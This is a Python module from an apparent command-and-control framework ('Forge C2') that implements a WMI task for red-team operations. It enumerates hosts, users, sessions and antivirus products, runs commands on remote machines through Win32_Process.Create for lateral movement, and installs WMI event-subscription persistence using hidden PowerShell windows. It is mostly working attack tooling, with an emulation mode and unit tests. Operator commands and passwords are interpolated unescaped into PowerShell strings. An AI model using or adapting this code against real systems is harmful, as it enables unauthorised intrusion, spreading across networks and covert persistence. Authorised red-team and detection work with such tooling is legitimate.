"""
Forge C2 — WMI Task
========================
Windows Management Instrumentation queries and remote execution.

Operations:
    • query  — Execute WQL queries for enumeration
    • exec   — Execute process via Win32_Process.Create (lateral movement)
    • event  — Create WMI event subscriptions (persistence)

Supports:
    • Local WMI queries (default)
    • Remote WMI via DCOM (lateral movement)
    • Common enumeration shortcuts (processes, services, shares, users)

MITRE ATT&CK: T1047 — Windows Management Instrumentation
FOR AUTHORIZED RED TEAM OPERATIONS ONLY.
"""
from __future__ import annotations

import asyncio
import json
import logging
import platform
import time
from dataclasses import dataclass, field
from typing import Any

from forge_c2.tasks.base_task import (
    BaseTask, TaskResult, TaskStatus, register_task,
)

log = logging.getLogger("forge.c2.tasks.wmi")


# ══════════════════════════════════════════════════════════════════════
#  COMMON WQL QUERIES (shortcuts)
# ══════════════════════════════════════════════════════════════════════

WQL_SHORTCUTS: dict[str, str] = {
    "processes": "SELECT ProcessId, Name, CommandLine, ParentProcessId FROM Win32_Process",
    "services": "SELECT Name, DisplayName, State, StartMode, PathName FROM Win32_Service",
    "shares": "SELECT Name, Path, Type, Description FROM Win32_Share",
    "users": "SELECT Name, Domain, SID, Disabled FROM Win32_UserAccount",
    "groups": "SELECT Name, Domain, SID FROM Win32_Group",
    "loggedon": "SELECT LogonId, LogonType, AuthenticationPackage FROM Win32_LogonSession",
    "os": "SELECT Caption, Version, BuildNumber, OSArchitecture, InstallDate FROM Win32_OperatingSystem",
    "disks": "SELECT DeviceID, Size, FreeSpace, FileSystem FROM Win32_LogicalDisk",
    "nics": "SELECT Description, IPAddress, MACAddress, DHCPEnabled FROM Win32_NetworkAdapterConfiguration WHERE IPEnabled = True",
    "software": "SELECT Name, Version, Vendor FROM Win32_Product",
    "startup": "SELECT Name, Command, Location FROM Win32_StartupCommand",
    "hotfixes": "SELECT HotFixID, Description, InstalledOn FROM Win32_QuickFixEngineering",
    "av": "SELECT displayName, productState FROM AntiVirusProduct",
    "bios": "SELECT Manufacturer, SMBIOSBIOSVersion, SerialNumber FROM Win32_BIOS",
}


@dataclass
class WMIQueryResult:
    """Structured WMI query result."""
    query: str
    rows: list[dict[str, Any]] = field(default_factory=list)
    columns: list[str] = field(default_factory=list)
    row_count: int = 0
    success: bool = True
    error: str = ""
    target: str = "localhost"

    def to_dict(self) -> dict[str, Any]:
        return {
            "query": self.query,
            "target": self.target,
            "row_count": self.row_count,
            "columns": self.columns,
            "rows": self.rows[:100],  # Cap for transport
            "success": self.success,
            "error": self.error,
        }


# ══════════════════════════════════════════════════════════════════════
#  WMI ENGINE
# ══════════════════════════════════════════════════════════════════════

class WMIEngine:
    """Cross-platform WMI execution engine."""

    def __init__(self, target: str = "localhost", username: str = "",
                 password: str = "", domain: str = "") -> None:
        self.target = target
        self.username = username
        self.password = password
        self.domain = domain
        self._is_windows = platform.system() == "Windows"
        self._is_remote = target.lower() not in ("localhost", "127.0.0.1", ".", "")

    async def query(self, wql: str) -> WMIQueryResult:
        """Execute a WQL query."""
        # Resolve shortcuts
        resolved = WQL_SHORTCUTS.get(wql.lower(), wql)

        if self._is_windows:
            return await self._query_windows(resolved)
        return self._query_emulation(resolved)

    async def execute_process(
        self, command: str, working_dir: str = "C:\\Windows\\System32",
    ) -> tuple[bool, int, str]:
        """Execute a process via WMI Win32_Process.Create.

        Returns (success, pid, error).
        """
        if self._is_windows:
            return await self._exec_windows(command, working_dir)
        return self._exec_emulation(command)

    async def create_event_subscription(
        self,
        name: str,
        wql_filter: str,
        command: str,
    ) -> tuple[bool, str]:
        """Create a WMI event subscription (persistence).

        Creates the classic three-part WMI persistence:
        1. __EventFilter (trigger condition)
        2. CommandLineEventConsumer (payload)
        3. __FilterToConsumerBinding (links 1→2)
        """
        if self._is_windows:
            return await self._event_sub_windows(name, wql_filter, command)
        return self._event_sub_emulation(name, wql_filter, command)

    # ── Windows implementations ────────────────────────────────────

    async def _query_windows(self, wql: str) -> WMIQueryResult:
        """Execute WQL via wmic.exe or PowerShell Get-WmiObject."""
        # Use PowerShell for cleaner output
        if self._is_remote:
            ps_cmd = (
                f"Get-WmiObject -Query \"{wql}\" "
                f"-ComputerName {self.target} "
            )
            if self.username:
                ps_cmd += (
                    f"-Credential (New-Object PSCredential("
                    f"'{self.domain}\\{self.username}', "
                    f"(ConvertTo-SecureString '{self.password}' -AsPlainText -Force)))"
                )
            ps_cmd += " | ConvertTo-Json -Depth 3"
        else:
            ps_cmd = f"Get-WmiObject -Query \"{wql}\" | ConvertTo-Json -Depth 3"

        try:
            proc = await asyncio.create_subprocess_exec(
                "powershell.exe", "-NoProfile", "-NonInteractive",
                "-Command", ps_cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
                **self._creation_flags(),
            )
            stdout, stderr = await asyncio.wait_for(
                proc.communicate(), timeout=60.0,
            )

            output = stdout.decode(errors="replace").strip()

            if proc.returncode != 0 or not output:
                err = stderr.decode(errors="replace") if stderr else "No output"
                return WMIQueryResult(
                    query=wql, success=False, error=err, target=self.target,
                )

            # Parse JSON output
            try:
                data = json.loads(output)
                if isinstance(data, dict):
                    data = [data]

                rows = []
                columns: set[str] = set()
                for item in data:
                    # Filter out WMI system properties
                    clean = {
                        k: v for k, v in item.items()
                        if not k.startswith("__") and k not in (
                            "PSComputerName", "Scope", "Path", "Options",
                            "ClassPath", "Properties", "SystemProperties",
                            "Qualifiers", "Site", "Container",
                        )
                    }
                    rows.append(clean)
                    columns.update(clean.keys())

                return WMIQueryResult(
                    query=wql,
                    rows=rows,
                    columns=sorted(columns),
                    row_count=len(rows),
                    target=self.target,
                )

            except json.JSONDecodeError:
                # Non-JSON output — return raw
                return WMIQueryResult(
                    query=wql,
                    rows=[{"raw_output": output}],
                    columns=["raw_output"],
                    row_count=1,
                    target=self.target,
                )

        except asyncio.TimeoutError:
            return WMIQueryResult(
                query=wql, success=False,
                error="WMI query timed out", target=self.target,
            )
        except Exception as exc:
            return WMIQueryResult(
                query=wql, success=False, error=str(exc), target=self.target,
            )

    async def _exec_windows(
        self, command: str, working_dir: str,
    ) -> tuple[bool, int, str]:
        """Execute process via WMI on Windows."""
        if self._is_remote:
            ps_cmd = (
                f"Invoke-WmiMethod -Class Win32_Process -Name Create "
                f"-ArgumentList '{command}' -ComputerName {self.target}"
            )
        else:
            ps_cmd = (
                f"Invoke-WmiMethod -Class Win32_Process -Name Create "
                f"-ArgumentList '{command}'"
            )

        try:
            proc = await asyncio.create_subprocess_exec(
                "powershell.exe", "-NoProfile", "-Command", ps_cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
                **self._creation_flags(),
            )
            stdout, stderr = await asyncio.wait_for(
                proc.communicate(), timeout=30.0,
            )

            output = stdout.decode(errors="replace")

            # Parse PID from output
            pid = 0
            for line in output.split("\n"):
                if "ProcessId" in line:
                    parts = line.split(":")
                    if len(parts) > 1:
                        try:
                            pid = int(parts[1].strip())
                        except ValueError:
                            pass

            return (proc.returncode == 0, pid, output)

        except Exception as exc:
            return (False, 0, str(exc))

    async def _event_sub_windows(
        self, name: str, wql_filter: str, command: str,
    ) -> tuple[bool, str]:
        """Create WMI event subscription on Windows."""
        # PowerShell WMI event subscription creation
        ps_script = f"""
$filter = Set-WmiInstance -Namespace "root\\subscription" -Class "__EventFilter" -Arguments @{{
    Name = "{name}_filter"
    EventNamespace = "root\\cimv2"
    QueryLanguage = "WQL"
    Query = "{wql_filter}"
}}

$consumer = Set-WmiInstance -Namespace "root\\subscription" -Class "CommandLineEventConsumer" -Arguments @{{
    Name = "{name}_consumer"
    CommandLineTemplate = "{command}"
}}

Set-WmiInstance -Namespace "root\\subscription" -Class "__FilterToConsumerBinding" -Arguments @{{
    Filter = $filter
    Consumer = $consumer
}}

Write-Output "WMI event subscription '{name}' created successfully"
"""
        try:
            proc = await asyncio.create_subprocess_exec(
                "powershell.exe", "-NoProfile", "-Command", ps_script,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
                **self._creation_flags(),
            )
            stdout, stderr = await asyncio.wait_for(
                proc.communicate(), timeout=30.0,
            )
            output = stdout.decode(errors="replace")
            return (proc.returncode == 0, output)

        except Exception as exc:
            return (False, str(exc))

    @staticmethod
    def _creation_flags() -> dict[str, int]:
        if platform.system() == "Windows":
            return {"creationflags": 0x08000000}
        return {}

    # ── Emulation ──────────────────────────────────────────────────

    def _query_emulation(self, wql: str) -> WMIQueryResult:
        """Return emulated WMI query results."""
        emulated_data: dict[str, list[dict[str, Any]]] = {
            "Win32_Process": [
                {"ProcessId": 4, "Name": "System", "CommandLine": "", "ParentProcessId": 0},
                {"ProcessId": 608, "Name": "lsass.exe", "CommandLine": "C:\\Windows\\system32\\lsass.exe", "ParentProcessId": 504},
                {"ProcessId": 1200, "Name": "svchost.exe", "CommandLine": "C:\\Windows\\system32\\svchost.exe -k netsvcs", "ParentProcessId": 608},
                {"ProcessId": 2400, "Name": "explorer.exe", "CommandLine": "C:\\Windows\\Explorer.EXE", "ParentProcessId": 2300},
            ],
            "Win32_Service": [
                {"Name": "Spooler", "DisplayName": "Print Spooler", "State": "Running", "StartMode": "Auto", "PathName": "C:\\Windows\\System32\\spoolsv.exe"},
                {"Name": "WinDefend", "DisplayName": "Windows Defender", "State": "Running", "StartMode": "Auto", "PathName": "MsMpEng.exe"},
            ],
            "Win32_Share": [
                {"Name": "ADMIN$", "Path": "C:\\Windows", "Type": 2147483648, "Description": "Remote Admin"},
                {"Name": "C$", "Path": "C:\\", "Type": 2147483648, "Description": "Default share"},
                {"Name": "IPC$", "Path": "", "Type": 2147483651, "Description": "Remote IPC"},
            ],
            "Win32_OperatingSystem": [
                {"Caption": "Microsoft Windows 10 Pro", "Version": "10.0.19045", "BuildNumber": "19045", "OSArchitecture": "64-bit"},
            ],
        }

        # Find matching emulated data
        rows: list[dict[str, Any]] = []
        for class_name, data in emulated_data.items():
            if class_name.lower() in wql.lower():
                rows = data
                break

        if not rows:
            rows = [{"EmulatedResult": f"Query: {wql}", "Note": "Emulation mode"}]

        columns = sorted(set().union(*(r.keys() for r in rows))) if rows else []

        return WMIQueryResult(
            query=wql, rows=rows, columns=columns,
            row_count=len(rows), target=self.target,
        )

    def _exec_emulation(self, command: str) -> tuple[bool, int, str]:
        import random
        pid = random.randint(1000, 65535)
        msg = (
            f"[EMULATION] WMI Process.Create:\n"
            f"  Target:  {self.target}\n"
            f"  Command: {command}\n"
            f"  PID:     {pid}\n"
        )
        return (True, pid, msg)

    def _event_sub_emulation(
        self, name: str, wql_filter: str, command: str,
    ) -> tuple[bool, str]:
        msg = (
            f"[EMULATION] WMI Event Subscription:\n"
            f"  Name:    {name}\n"
            f"  Filter:  {wql_filter}\n"
            f"  Command: {command}\n"
            f"  Status:  Would create __EventFilter + CommandLineEventConsumer + Binding\n"
        )
        return (True, msg)


# ══════════════════════════════════════════════════════════════════════
#  TASK CLASS
# ══════════════════════════════════════════════════════════════════════

@register_task
class WMITask(BaseTask):
    """WMI query and execution for enumeration and lateral movement.

    Args (via kwargs):
        operation:   "query", "exec", "event" (default "query")
        query:       WQL query string or shortcut name
                     Shortcuts: processes, services, shares, users, os, etc.
        command:     Command to execute (for exec/event operations)
        target:      Remote host (default localhost)
        username:    Authentication username (for remote)
        password:    Authentication password (for remote)
        domain:      Domain for authentication
        working_dir: Working directory for exec (default C:\\Windows\\System32)
        event_name:  Name for event subscription
        event_filter: WQL filter for event subscription
        output_format: "text" or "json" (default "text")

    MITRE ATT&CK: T1047 — Windows Management Instrumentation
    """

    TASK_TYPE = "wmi"
    DESCRIPTION = "WMI query/exec for enum and lateral"
    OPSEC_RISK = "high"
    MITRE_ID = "T1047"

    async def execute(self) -> TaskResult:
        operation = self.args.get("operation", "query").lower()
        query = self.args.get("query", "")
        command = self.args.get("command", "")
        target = self.args.get("target", "localhost")
        username = self.args.get("username", "")
        password = self.args.get("password", "")
        domain = self.args.get("domain", "")
        working_dir = self.args.get("working_dir", "C:\\Windows\\System32")
        event_name = self.args.get("event_name", "")
        event_filter = self.args.get("event_filter", "")
        output_format = self.args.get("output_format", "text")

        start = time.time()

        engine = WMIEngine(
            target=target, username=username,
            password=password, domain=domain,
        )

        try:
            if operation == "query":
                if not query:
                    # Show available shortcuts
                    shortcuts = "\n".join(
                        f"  {name:14s} → {wql[:60]}"
                        for name, wql in sorted(WQL_SHORTCUTS.items())
                    )
                    return TaskResult(
                        task_id=self.task_id,
                        status=TaskStatus.COMPLETED,
                        output=f"WMI Query Shortcuts:\n\n{shortcuts}\n\n"
                               f"Usage: wmi <shortcut> or wmi \"SELECT ...\"",
                        started_at=start,
                        completed_at=time.time(),
                    )

                result = await engine.query(query)

                if not result.success:
                    return TaskResult(
                        task_id=self.task_id, status=TaskStatus.FAILED,
                        error=result.error, started_at=start, completed_at=time.time(),
                    )

                if output_format == "json":
                    output = json.dumps(result.to_dict(), indent=2, default=str)
                else:
                    output = self._format_query_result(result)

            elif operation == "exec":
                if not command:
                    return TaskResult(
                        task_id=self.task_id, status=TaskStatus.FAILED,
                        error="No command specified for WMI exec.",
                        started_at=start, completed_at=time.time(),
                    )

                success, pid, msg = await engine.execute_process(command, working_dir)

                if not success:
                    return TaskResult(
                        task_id=self.task_id, status=TaskStatus.FAILED,
                        error=msg, started_at=start, completed_at=time.time(),
                    )

                output = (
                    f"WMI Process.Create succeeded\n"
                    f"  Target:  {target}\n"
                    f"  Command: {command}\n"
                    f"  PID:     {pid}\n"
                    f"\n{msg}"
                )

            elif operation == "event":
                if not event_name or not event_filter or not command:
                    return TaskResult(
                        task_id=self.task_id, status=TaskStatus.FAILED,
                        error="event requires event_name, event_filter, and command.",
                        started_at=start, completed_at=time.time(),
                    )

                success, msg = await engine.create_event_subscription(
                    event_name, event_filter, command,
                )

                if not success:
                    return TaskResult(
                        task_id=self.task_id, status=TaskStatus.FAILED,
                        error=msg, started_at=start, completed_at=time.time(),
                    )

                output = msg

            else:
                return TaskResult(
                    task_id=self.task_id, status=TaskStatus.FAILED,
                    error=f"Unknown operation: {operation}. Use query/exec/event.",
                    started_at=start, completed_at=time.time(),
                )

            return TaskResult(
                task_id=self.task_id,
                status=TaskStatus.COMPLETED,
                output=output,
                started_at=start,
                completed_at=time.time(),
                metadata={
                    "operation": operation,
                    "target": target,
                    "query": query,
                    "mitre": self.MITRE_ID,
                },
            )

        except Exception as exc:
            return TaskResult(
                task_id=self.task_id, status=TaskStatus.FAILED,
                error=str(exc), started_at=start, completed_at=time.time(),
            )

    @staticmethod
    def _format_query_result(result: WMIQueryResult) -> str:
        """Format WMI query result as a table."""
        if not result.rows:
            return f"Query returned 0 rows.\nWQL: {result.query}"

        lines = [
            f"WMI Query: {result.query}",
            f"Target: {result.target} | Rows: {result.row_count}\n",
        ]

        # Build table
        columns = result.columns[:10]  # Limit width

        if columns:
            # Calculate column widths
            widths = {col: len(col) for col in columns}
            for row in result.rows[:50]:
                for col in columns:
                    val = str(row.get(col, ""))[:40]
                    widths[col] = max(widths[col], len(val))

            # Header
            header = "  ".join(f"{col:{widths[col]}s}" for col in columns)
            lines.append(f"  {header}")
            lines.append(f"  {'─' * len(header)}")

            # Rows
            for row in result.rows[:50]:
                vals = []
                for col in columns:
                    val = str(row.get(col, ""))[:40]
                    vals.append(f"{val:{widths[col]}s}")
                lines.append(f"  {'  '.join(vals)}")

            if result.row_count > 50:
                lines.append(f"\n  ... {result.row_count - 50} more rows")

        return "\n".join(lines)


# ══════════════════════════════════════════════════════════════════════
#  UNIT TESTS
# ══════════════════════════════════════════════════════════════════════

class TestWMITask:
    """Tests for WMI task."""

    def test_encode(self) -> None:
        task = WMITask(task_id="wmi1", query="processes")
        encoded = task.encode()
        assert encoded["type"] == "wmi"

    def test_decode(self) -> None:
        data = {"task_id": "wmi2", "type": "wmi",
                "args": {"query": "services"}}
        task = WMITask.decode(data)
        assert task.args["query"] == "services"

    def test_shortcuts_exist(self) -> None:
        assert "processes" in WQL_SHORTCUTS
        assert "services" in WQL_SHORTCUTS
        assert "users" in WQL_SHORTCUTS
        assert "shares" in WQL_SHORTCUTS

    def test_emulation_query(self) -> None:
        import asyncio
        task = WMITask(task_id="wmi3", query="processes")
        result = asyncio.run(task.execute())
        assert result.status == TaskStatus.COMPLETED

    def test_no_query_shows_shortcuts(self) -> None:
        import asyncio
        task = WMITask(task_id="wmi4", operation="query")
        result = asyncio.run(task.execute())
        assert result.status == TaskStatus.COMPLETED
        assert "Shortcuts" in result.output

    def test_exec_no_command(self) -> None:
        import asyncio
        task = WMITask(task_id="wmi5", operation="exec")
        result = asyncio.run(task.execute())
        assert result.status == TaskStatus.FAILED

    def test_invalid_operation(self) -> None:
        import asyncio
        task = WMITask(task_id="wmi6", operation="bogus")
        result = asyncio.run(task.execute())
        assert result.status == TaskStatus.FAILED

    def test_query_result_to_dict(self) -> None:
        r = WMIQueryResult(query="test", rows=[{"a": 1}], row_count=1)
        d = r.to_dict()
        assert d["row_count"] == 1
